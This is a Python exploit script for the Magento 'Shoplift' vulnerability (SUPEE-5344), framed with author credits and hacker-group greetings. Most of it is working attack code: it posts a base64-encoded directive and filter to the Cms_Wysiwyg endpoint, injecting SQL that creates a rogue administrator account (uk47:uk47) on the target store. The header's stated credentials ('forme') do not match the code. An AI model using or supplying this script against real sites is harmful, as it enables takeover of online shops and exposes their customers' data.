##################################################################################################
#Exploit Title : Magento Shoplift exploit (SUPEE-5344)
#Author        : Manish Kishan Tanwar AKA error1046
#Date          : 25/08/2015
#Love to       : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,Jagriti,Kishan Singh and ritu rathi
#Debugged At  : Indishell Lab(originally developed by joren)
##################################################################################################

# ////////////////////////
# /// Overview:
# ////////////////////////

# Magento shoplift bug originally discovered by CheckPoint team (http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/)
# This python script developed by joren but it was having some bug because of which it was not working properly.
# If magento version is vulnerable, this script will create admin account with username forme and password forme



# ////////////////
# ///  POC   ////
# ///////////////
# Exploit script starts here
# ///////////////////
#Thanks to
# Zero cool, code breaker ICA, Team indishell, my father , rr mam, jagriti and DON
import requests
import base64
import sys

target = "http://10.129.1.182/index.php"

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""


query = q.replace("\n", "").format(username="uk47", password="uk47")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url,
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter),
                        "forwarded": 1})
if r.ok:
    print "WORKED"
    print "Check {0}/admin with creds uk47:uk47".format(target)
else:
    print "DID NOT WORK"





# /////////////////
# exploit code ends here
#
#
#
#
#                              --==[[ Greetz To ]]==--
# ############################################################################################
# #Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba,
# #Silent poison India,Magnum sniper,ethicalnoob Indishell,Reborn India,L0rd Crus4d3r,cool toad,
# #Hackuin,Alicks,mike waals,Suriya Prakash, cyber gladiator,Cyber Ace,Golden boy INDIA,
# #Ketan Singh,AR AR,saad abbasi,Minhal Mehdi ,Raj bhai ji ,Hacking queen,lovetherisk,Bikash Dash
# #############################################################################################
#                              --==[[Love to]]==--
# # My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,
# #Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Jagriti,Salty and Don(Deepika kaushik)
#                        --==[[ Special Fuck goes to ]]==--
#                             <3  suriya Cyber Tyson <3
